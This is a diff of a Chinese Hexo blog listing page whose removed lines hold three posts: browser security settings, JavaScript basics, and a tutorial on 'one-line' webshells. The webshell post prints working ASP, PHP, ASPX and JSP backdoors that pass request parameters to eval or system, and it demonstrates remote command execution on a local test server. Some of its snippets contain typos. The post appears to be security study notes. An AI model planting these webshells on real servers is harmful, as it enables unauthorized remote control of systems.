-              <time title="创建时间：2019-03-06 21:20:33 / 修改时间：21:29:38" itemprop="dateCreated datePublished" datetime="2019-03-06T21:20:33+08:00">2019-03-06</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/工具/" itemprop="url" rel="index"><span itemprop="name">工具</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="·浏览器安全性特性"><a href="#·浏览器安全性特性" class="headerlink" title="·浏览器安全性特性"></a>·浏览器安全性特性</h2><p><img src="/2019/03/06/browser/1.jpg" alt="不同的浏览器安全特性存在差异，可以导致同一个漏洞在不同浏览器触发效果不同"></p>
-<h2 id="一、介绍chrome浏览器"><a href="#一、介绍chrome浏览器" class="headerlink" title="一、介绍chrome浏览器"></a>一、介绍chrome浏览器</h2><p><strong>1、如何修改安全设置？</strong><br>常规设置步骤<br><img src="/2019/03/06/browser/2.jpg" alt="在这里插入图片描述"><br>快捷设置步骤<br><img src="/2019/03/06/browser/3.jpg" alt="在这里插入图片描述"><br><strong>2、如何清除缓存</strong><br><img src="/2019/03/06/browser/4.jpg" alt="在这里插入图片描述"><br><strong>3、每一次都去清除缓存太麻烦了，可以使用隐身模式（无痕模式）</strong></p>
-<p>在功能菜单中选择新建无痕窗口即可<br><img src="/2019/03/06/browser/5.jpg" alt="在这里插入图片描述"><br>3、如何查看网页源代码呢？<br><img src="/2019/03/06/browser/6.jpg" alt="在这里插入图片描述"><br><img src="/2019/03/06/browser/7.jpg" alt="在这里插入图片描述"><br><strong>4、如何查看DOM元素？</strong><br><img src="/2019/03/06/browser/8.jpg" alt="在这里插入图片描述"><br>F12直接打开下面的开发者工具栏<br><img src="/2019/03/06/browser/9.jpg" alt="在这里插入图片描述"><br><strong>5、如何查看网络数据包</strong><br><img src="/2019/03/06/browser/10.jpg" alt="在这里插入图片描述"><br><img src="/2019/03/06/browser/11.jpg" alt="在这里插入图片描述"><br><img src="/2019/03/06/browser/12.jpg" alt="在这里插入图片描述"></p>
-<h2 id="二、介绍火狐浏览器"><a href="#二、介绍火狐浏览器" class="headerlink" title="二、介绍火狐浏览器"></a>二、介绍火狐浏览器</h2><p>火狐浏览器有个强大的插件库<br><img src="/2019/03/06/browser/13.jpg" alt="在这里插入图片描述"><br><strong>1、如何修改安全设置</strong><br><img src="/2019/03/06/browser/14.jpg" alt="在这里插入图片描述"></p>
-<h2 id="三、介绍IE浏览器"><a href="#三、介绍IE浏览器" class="headerlink" title="三、介绍IE浏览器"></a>三、介绍IE浏览器</h2><p>如何修改安全设置<br><img src="/2019/03/06/browser/15.jpg" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/03/muma/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/03/muma/" class="post-title-link" itemprop="url">脚本木马的制作与原理(主要介绍一句话木马)</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-03 21:52:29 / 修改时间：22:01:43" itemprop="dateCreated datePublished" datetime="2019-03-03T21:52:29+08:00">2019-03-03</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/工具/" itemprop="url" rel="index"><span itemprop="name">工具</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="webshell（web后门）"><a href="#webshell（web后门）" class="headerlink" title="webshell（web后门）"></a>webshell（web后门）</h1><h2 id="一、一句话木马"><a href="#一、一句话木马" class="headerlink" title="一、一句话木马"></a><strong>一、一句话木马</strong></h2><p>短小精悍，功能强大，隐蔽性好。</p>
-<pre><code>&lt;%
-execute request(&quot;value&quot;)
-%&gt;
-</code></pre><p>说明：<br>使用request的话，post和get两中方式传来的数据都可以接受。</p>
-<p>execute用来执行客户端传来的数据。</p>
-<p>代码本身没有危害，关键在于我们传输的数据是什么。</p>
-<h2 id="常见写法"><a href="#常见写法" class="headerlink" title="常见写法"></a>常见写法</h2><p><strong>asp一句话木马</strong></p>
-<pre><code>&lt;%eval request(&quot;c&quot;)%&gt;
-</code></pre><p><strong>php一句话木马</strong></p>
-<pre><code>&lt;?php @eval($_POST[‘value’]);?&gt;
-</code></pre><p><strong>aspx一句话木马</strong></p>
-<pre><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;
-&lt;%eval(Request.ltem[&quot;value&quot;])%&gt;
-</code></pre><p><strong>jsp一句话木马</strong></p>
-<pre><code>&lt; % if(request.getParametere(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;)))write(request.getParameter(&quot;t&quot;).getBytes());% &gt;
-</code></pre><p><strong>利用中国菜刀进行连接</strong><br>这边我用phpstudy做演示，需要把一句话木马文件放在网站根目录。<br><img src="/2019/03/03/muma/1.jpg" alt="在这里插入图片描述"><br>一句话木马内容为</p>
-<pre><code>&lt;?php @eval($_REQUEST[&apos;xx&apos;]);
-?&gt;   
-</code></pre><p><img src="/2019/03/03/muma/2.jpg" alt="在这里插入图片描述"><br><img src="/2019/03/03/muma/3.jpg" alt="在这里插入图片描述"><br>可以手动获取信息<br><img src="/2019/03/03/muma/4.jpg" alt="在这里插入图片描述"><br>我们把一句话木马内容改成</p>
-<pre><code>&lt;?php @system($_REQUEST[&apos;xx&apos;]);
-    ?&gt;   
-</code></pre><p>这样可以执行系统命令。注意再次使用中国菜刀连接其他链接之前，需要重置下缓存。<br>在浏览器输入</p>
-<pre><code>http://localhost/123.php?xx=ipconfig
-</code></pre><p>执行系统命令</p>
-<p><img src="/2019/03/03/muma/5.jpg" alt="在这里插入图片描述"><br><strong>图片木马的制作</strong><br><img src="/2019/03/03/muma/6.jpg" alt="在这里插入图片描述"><br>上传到服务器后不能直接执行，得想办法改成脚本格式或者在特定环境下以脚本运行</p>
-<p>一句话使用技巧<br><img src="/2019/03/03/muma/7.jpg" alt="在这里插入图片描述"></p>
-<h2 id="二、小马、大马"><a href="#二、小马、大马" class="headerlink" title="二、小马、大马"></a>二、小马、大马</h2><p><img src="/2019/03/03/muma/8.jpg" alt="在这里插入图片描述"><br><img src="/2019/03/03/muma/9.jpg" alt="在这里插入图片描述"><br><img src="/2019/03/03/muma/10.jpg" alt="在这里插入图片描述"><br>还有其他木马，如打包马、脱裤马等等</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/03/js/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/03/js/" class="post-title-link" itemprop="url">JavaScript基础</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-03 21:50:36 / 修改时间：22:01:32" itemprop="dateCreated datePublished" datetime="2019-03-03T21:50:36+08:00">2019-03-03</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/js/" itemprop="url" rel="index"><span itemprop="name">js</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>JavaScript 是互联网上最受欢迎的编程语言之一，用于为网页添加交互性，处理数据，以及创建各种应用程序（移动应用程序，桌面应用程序，游戏等）,这门语言可用于 HTML 和 web，更可广泛用于服务器、PC、笔记本电脑、平板电脑和智能手机等设备。</p>
-<h2 id="二、用法"><a href="#二、用法" class="headerlink" title="二、用法"></a>二、用法</h2><p>在html中必须写在<code>&lt;script&gt;&lt;/script&gt;</code>中写入js代码。在网页中通常通过head和body增加javascript。</p>
-<h2 id="二、基础语法"><a href="#二、基础语法" class="headerlink" title="二、基础语法"></a>二、基础语法</h2><p><strong>1、javaScript的输出</strong></p>
-<p>使用<code>doument.write()</code>方法将内容写到html页面中<br>如：</p>
-<pre><code>&lt;script&gt;document.write(&quot;hhhh&quot;)
-&lt;/script&gt;
-</code></pre><p><strong>2、window.alter()弹出警告框</strong></p>
-<pre><code>&lt;script&gt;window.alter(&quot;hhhh&quot;)
-    &lt;/script&gt;
-</code></pre><p><strong>3、用innerHTML写入到html元素中</strong></p>
-<pre><code>demoP.innerHTML=&quot;a=&quot;+a+&quot;,b=&quot;+b;
-</code></pre><p><strong>4、使用<code>console.log（）</code>写入到浏览器的控制台。</strong></p>
-<p><strong>5、<code>document.getElementById(“demo”)</code> 是使用 id 属性来查找 HTML 元素的 JavaScript 代码 。</strong></p>
-<p><strong>6、 <code>innerHTML = “Paragraph changed.”</code> 是用于修改元素的 HTML 内容(innerHTML)的 JavaScript 代码。</strong></p>
-<p><strong>7、格式化文本</strong><br>使用html标签来格式化javascript中的文本<br>如：</p>
-<pre><code>&lt;script&gt;
-       document.write(&quot;&lt;h1&gt;hello world&lt;/h1&gt;&quot;);
-   &lt;/script&gt;
-</code></pre><p><strong>8、&lt; script &gt;标签</strong><br>language和type两个属性，指定脚本类型</p>
-<pre><code>&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;
-&lt;/script&gt;
-</code></pre><p><strong>9、外部javascript</strong><br>在多个不同网页中使用相同的代码时，外部脚本是很实用的，javascript文件的文件后缀是.js。<br>要使用外部脚本，将脚本文件的名称放在&lt; script &gt;标签的src属性中。</p>
-<pre><code>&lt; script src=&quot;index.js&quot;&gt;&lt; /script &gt;
-</code></pre><p>注意：<br>外部脚本不能使用&lt; script&gt;标签包裹，可以在&lt; head&gt;或&lt; body&gt;中放置外部脚本引用，将javascript放在外部文件中具有以下优点：<br>（1）分离html和代码。<br>（2）使html和javascript更容易阅读和维护。<br>（3）缓存的javascript文件可以加快页面加载速度。</p>
-<p><strong>10、js变量声明</strong><br>用var来声明变量，注意js是区分大小写的</p>
-<pre><code>var x=5
-</code></pre><p>变量命名的规则：<br>a.变量必须以字母开头。<br>b.变量也能以$和_符号开头（不推荐）。<br>c.大小写不一样。<br>d.变量名称不能包含空格。</p>
-<p><strong>11、基本数据类型</strong><br>只有一种数字类型，可以带小数，也可以不带。<br>可以使用科学记数法来书写</p>
-<pre><code>var y = 123e5  ;//&lt;!--12300000--&gt;
-var y = 123e-5 ;//&lt;!--0.00123--&gt;
-</code></pre><p>字符串，用单引号、双引号都可以</p>
-<pre><code>var pangzi = &quot;yang xiao pang&quot; ;
-var pangzi = &apos;yang xiao pang&apos; ;
-</code></pre><p>但如果想在引号中再使用引号，须使用“\”转意处理引号中的引号。（如果引号类型不同则不用）</p>
-<pre><code>var p= &quot;y \&quot;xiao p\&quot;&quot; ;
-var p = &apos;y \&apos;xiao p\&apos;&apos; ;
-</code></pre><p><strong>12、布尔</strong>：<br>当值为0，null，undefined，空字符串时，布尔值为false。<br>任何拥有值的字符串其布尔值为true。</p>
-<p><strong>13、数组</strong></p>
-<pre><code> &lt;script&gt;
-        var fatty = new Array();
-        fatty[0] = &quot;杨小胖&quot;;
-        fatty[1] = &quot;景小胖&quot;;
-        document.write(fatty);
-    &lt;/script&gt;
-    或
-    &lt;script&gt;
-    var fatty = new Array(&quot;杨小胖&quot;,&quot;景小胖&quot;);
-    document.write(fatty);
-&lt;/script&gt;
-</code></pre><p><strong>14、</strong>复杂数据类型<em>**</em><br>对象</p>
-<pre><code>var fatty = {firstname = &quot;yang&quot;,lastname=&quot;yi&quot; ,id:1209｝;
-</code></pre><p><strong>对象的两种寻址方式：</strong></p>
-<pre><code>name = person.lastname;
-name = person[&quot;lasrname&quot;];
-</code></pre><p>声明变量类型：用new声明</p>
-<pre><code>var fatty = new String;
-</code></pre><p>注意<br>javascript变量均为对象，当声明一个变量时，就创建了一个新的对象。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -2266,7 +2312,7 @@ name = person[&quot;lasrname&quot;];
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">25</span>
+                    <span class="site-state-item-count">31</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
